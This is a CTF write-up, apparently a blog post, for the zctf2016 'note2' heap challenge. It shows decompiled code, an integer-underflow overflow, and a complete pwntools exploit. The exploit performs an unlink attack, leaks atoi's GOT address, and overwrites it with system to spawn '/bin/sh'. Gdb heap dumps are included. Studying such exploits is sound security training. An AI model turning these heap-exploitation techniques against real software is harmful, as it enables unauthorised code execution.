@@ -1,0 +1,367 @@
+---
+layout: post
+title:  note2(zctf2016)
+date:   2022-10-01 00:08:01 +0300
+image:  2022-10-01-kitten.jpg
+tags:   [ctf,pwn,ubuntu16,unlink,heap,hitcon,zctf]
+---
+
+main
+
+```assembly
+void __fastcall main(int a1, char **a2, char **a3)
+{
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stderr, 0LL, 2, 0LL);
+  alarm(0x3Cu);
+  puts("Input your name:");
+  sub_4009BD(&unk_6020E0, 0x40LL, 0xALL);
+  puts("Input your address:");
+  sub_4009BD(&unk_602180, 0x60LL, 0xALL);
+  while ( 1 )
+  {
+    switch ( (unsigned int)sub_400AFB() )
+    {
+      case 1u:
+        new();
+        break;
+      case 2u:
+        show();
+        break;
+      case 3u:
+        edit();
+        break;
+      case 4u:
+        delete();
+        break;
+      case 5u:
+        puts("Bye~");
+        exit(0);
+      case 6u:
+        exit(0);
+      default:
+        continue;
+    }
+  }
+}
+```
+
+add
+
+```assembly
+int new()
+{
+  unsigned int v1; // eax
+  unsigned int size; // [rsp+4h] [rbp-Ch]
+  void *ptr; // [rsp+8h] [rbp-8h]
+
+  if ( (unsigned int)dword_602160 > 3 )
+    return puts("note lists are full");
+  puts("Input the length of the note content:(less than 128)");
+  size = sub_400A4A();
+  if ( size > 0x80 )
+    return puts("Too long");
+  ptr = malloc(size);
+  puts("Input the note content:");
+  sub_4009BD(ptr, size, 0xALL);
+  sub_400B10(ptr);
+  *(&::ptr + (unsigned int)dword_602160) = ptr;
+  sizes[dword_602160] = size;
+  v1 = dword_602160++;
+  return printf("note add success, the id is %d\n", v1);
+}
+```
+
+sub_4009BD
+
+```assembly
+unsigned __int64 __fastcall sub_4009BD(__int64 a1, __int64 size, char a3)
+{
+  char buf; // [rsp+2Fh] [rbp-11h] BYREF
+  unsigned __int64 i; // [rsp+30h] [rbp-10h]
+  ssize_t v7; // [rsp+38h] [rbp-8h]
+
+  for ( i = 0LL; size - 1 > i; ++i )
+  {
+    v7 = read(0, &buf, 1uLL);
+    if ( v7 <= 0 )
+      exit(0xFFFFFFFF);
+    if ( buf == a3 )
+      break;
+    *(_BYTE *)(i + a1) = buf;
+  }
+  *(_BYTE *)(a1 + i) = 0;
+  return i;
+}
+```
+
+其中 i 是 unsigned 类型，a2 为 int 类型，所以两者在 for 循环相比较的时候，a2-1 的结果 - 1 会被视为 unsigned 类型，此时，即最大的整数，所以可以写入任意长度的数据
+
+show
+
+```assembly
+int show()
+{
+  __int64 v0; // rax
+  int v2; // [rsp+Ch] [rbp-4h]
+
+  puts("Input the id of the note:");
+  LODWORD(v0) = sub_400A4A();
+  v2 = v0;
+  if ( (int)v0 >= 0 && (int)v0 <= 3 )
+  {
+    v0 = (__int64)*(&ptr + (int)v0);
+    if ( v0 )
+      LODWORD(v0) = printf("Content is %s\n", (const char *)*(&ptr + v2));
+  }
+  return v0;
+}
+```
+
+edit
+
+```assembly
+unsigned __int64 edit()
+{
+  _BYTE *v0; // rbx
+  int index; // [rsp+8h] [rbp-E8h]
+  int choice; // [rsp+Ch] [rbp-E4h]
+  char *src; // [rsp+10h] [rbp-E0h]
+  __int64 v5; // [rsp+18h] [rbp-D8h]
+  char dest[128]; // [rsp+20h] [rbp-D0h] BYREF
+  void *v7; // [rsp+A0h] [rbp-50h]
+  unsigned __int64 v8; // [rsp+D8h] [rbp-18h]
+
+  v8 = __readfsqword(0x28u);
+  if ( dword_602160 )
+  {
+    puts("Input the id of the note:");
+    index = sub_400A4A();
+    if ( index >= 0 && index <= 3 )
+    {
+      src = (char *)*(&ptr + index);
+      v5 = sizes[index];                        // 8
+      if ( src )
+      {
+        puts("do you want to overwrite or append?[1.overwrite/2.append]");
+        choice = sub_400A4A();
+        if ( choice == 1 || choice == 2 )
+        {
+          if ( choice == 1 )
+            dest[0] = 0;
+          else
+            strcpy(dest, src);
+          v7 = malloc(0xA0uLL);
+          strcpy((char *)v7, "TheNewContents:");
+          printf((const char *)v7);
+          sub_4009BD((__int64)v7 + 0xF, 0x90LL, 0xA);
+          sub_400B10((const char *)v7 + 0xF);
+          v0 = v7;
+          v0[v5 - strlen(dest) + 0xE] = 0;
+          strncat(dest, (const char *)v7 + 0xF, 0xFFFFFFFFFFFFFFFFLL);
+          strcpy(src, dest);
+          free(v7);
+          puts("Edit note success!");
+        }
+        else
+        {
+          puts("Error choice!");
+        }
+      }
+      else
+      {
+        puts("note has been deleted");
+      }
+    }
+  }
+  else
+  {
+    puts("Please add a note!");
+  }
+  return __readfsqword(0x28u) ^ v8;
+}
+```
+
+delete
+
+```assembly
+int delete()
+{
+  __int64 index; // rax
+  int v2; // [rsp+Ch] [rbp-4h]
+
+  puts("Input the id of the note:");
+  LODWORD(index) = sub_400A4A();
+  v2 = index;
+  if ( (int)index >= 0 && (int)index <= 3 )
+  {
+    index = (__int64)*(&ptr + (int)index);
+    if ( index )
+    {
+      free(*(&ptr + v2));
+      *(&ptr + v2) = 0LL;
+      sizes[v2] = 0LL;
+      LODWORD(index) = puts("delete note success!");
+    }
+  }
+  return index;
+}
+```
+
+程序在每次编辑 note 时，都会申请 0xa0 大小的内存，但是在 free 之后并没有设置为 NULL。
+
+> 申请的大小为 0，但是 glibc 的要求 chunk 块至少可以存储 4 个必要的字段 (prev_size,size,fd,bk)，所以会分配 0x20 的空间。
+
+exp
+
+```assembly
+#-*-coding:utf-8-*-
+from pwn import *
+from LibcSearcher import *
+
+io = remote("node4.buuoj.cn", 27351)
+# io = process("./note2")
+
+
+def add(length, content):
+    io.recvuntil('option--->>')
+    io.sendline('1')
+    io.recvuntil('(less than 128)')
+    io.sendline(str(int(length)))
+    io.recvuntil('content:')
+    io.sendline(content)
+
+
+def show(id):
+    io.recvuntil('option--->>')
+    io.sendline('2')
+    io.recvuntil('note:')
+    io.sendline(str(id))
+
+
+def edit(id, choice, s):
+    io.recvuntil('option--->>')
+    io.sendline('3')
+    io.recvuntil('note:')
+    io.sendline(str(id))
+    io.recvuntil('2.append]')
+    io.sendline(str(choice))
+    io.sendline(s)
+
+
+def delete(id):
+    io.recvuntil('option--->>')
+    io.sendline('4')
+    io.recvuntil('note:')
+    io.sendline(str(id))
+
+
+io.recvuntil("Input your name:")
+io.sendline("melody")
+io.recvuntil("Input your address:")
+io.sendline("there")
+
+
+target = 0x602120   # 0
+fd = target - 0x18
+bk = target - 0x10
+
+payload = 'a' * 8 + p64(0x61)
+payload += p64(fd) + p64(bk)
+payload += 'b' * 64 + p64(0x60)
+
+add(0x80, payload)  # 0
+add(0, "aaaaaaaa")  # 1
+add(0x80, "bbbbbbbb")  # 2
+'''
+gdb-peda$ x/100gx 0x00000000017f0000
+0x17f0000:	0x0000000000000000	0x0000000000000091 0
+0x17f0010:	0x6161616161616161	0x0000000000000061
+0x17f0020:	0x0000000000602108	0x0000000000602110
+0x17f0030:	0x6262626262626262	0x6262626262626262
+0x17f0040:	0x6262626262626262	0x6262626262626262
+0x17f0050:	0x6262626262626262	0x6262626262626262
+0x17f0060:	0x6262626262626262	0x6262626262626262
+0x17f0070:	0x0000000000000060	0x0000000000000000
+0x17f0080:	0x0000000000000000	0x0000000000000000
+0x17f0090:	0x0000000000000000	0x0000000000000021 1
+0x17f00a0:	0x6161616161616161	0x0000000000000000
+0x17f00b0:	0x0000000000000000	0x0000000000000091 2
+0x17f00c0:	0x6262626262626262	0x0000000000000000
+0x17f00d0:	0x0000000000000000	0x0000000000000000
+0x17f00e0:	0x0000000000000000	0x0000000000000000
+0x17f00f0:	0x0000000000000000	0x0000000000000000
+0x17f0100:	0x0000000000000000	0x0000000000000000
+0x17f0110:	0x0000000000000000	0x0000000000000000
+0x17f0120:	0x0000000000000000	0x0000000000000000
+0x17f0130:	0x0000000000000000	0x0000000000000000
+0x17f0140:	0x0000000000000000	0x0000000000020ec1
+'''
+
+# edit the chunk1 to overwrite the chunk2
+delete(1)
+content = 'a' * 16 + p64(0xa0) + p64(0x90)
+add(0, content)
+# delete note 2 to trigger the unlink
+# after unlink, ptr[0] = ptr - 0x18
+delete(2)
+'''
+gdb-peda$ x/100gx 0x1d80000
+0x1d80000:	0x0000000000000000	0x0000000000000091 0
+0x1d80010:	0x6161616161616161	0x0000000000020ff1
+0x1d80020:	0x0000000000602108	0x0000000000602110
+0x1d80030:	0x6262626262626262	0x6262626262626262
+0x1d80040:	0x6262626262626262	0x6262626262626262
+0x1d80050:	0x6262626262626262	0x6262626262626262
+0x1d80060:	0x6262626262626262	0x6262626262626262
+0x1d80070:	0x0000000000000060	0x0000000000000000
+0x1d80080:	0x0000000000000000	0x0000000000000000
+0x1d80090:	0x0000000000000000	0x0000000000000021 3
+0x1d800a0:	0x6161616161616161	0x6161616161616161
+0x1d800b0:	0x00000000000000a0	0x0000000000000090
+0x1d800c0:	0x6262626262626200	0x0000000000000000
+0x1d800d0:	0x0000000000000000	0x0000000000000000
+0x1d800e0:	0x0000000000000000	0x0000000000000000
+0x1d800f0:	0x0000000000000000	0x0000000000000000
+0x1d80100:	0x0000000000000000	0x0000000000000000
+0x1d80110:	0x0000000000000000	0x0000000000000000
+0x1d80120:	0x0000000000000000	0x0000000000000000
+0x1d80130:	0x0000000000000000	0x0000000000000000
+0x1d80140:	0x0000000000000000	0x0000000000020ec1
+'''
+'''
+gdb-peda$ x/10gx 0x602120
+0x602120:	0x0000000000602108	0x0000000000000000
+0x602130:	0x0000000000000000	0x0000000001d800a0
+'''
+
+
+atoi_got = 0x602088
+payload2 = "a"*0x18
+payload2 += p64(atoi_got)
+edit(0, 1, payload2)
+show(0)
+
+
+io.recvuntil("Content is ")
+addr = u64(io.recvuntil("\n")[:-1].ljust(8, "\x00"))
+print(hex(addr))
+
+
+libc = LibcSearcher("atoi", addr)
+base = addr - libc.dump("atoi")
+system = base + libc.dump("system")
+edit(0, 1, p64(system))
+
+io.recvuntil('option--->>')
+io.sendline('/bin/sh')
+
+
+# gdb.attach(io)
+# raw_input()
+
+
+io.interactive()
+```
+
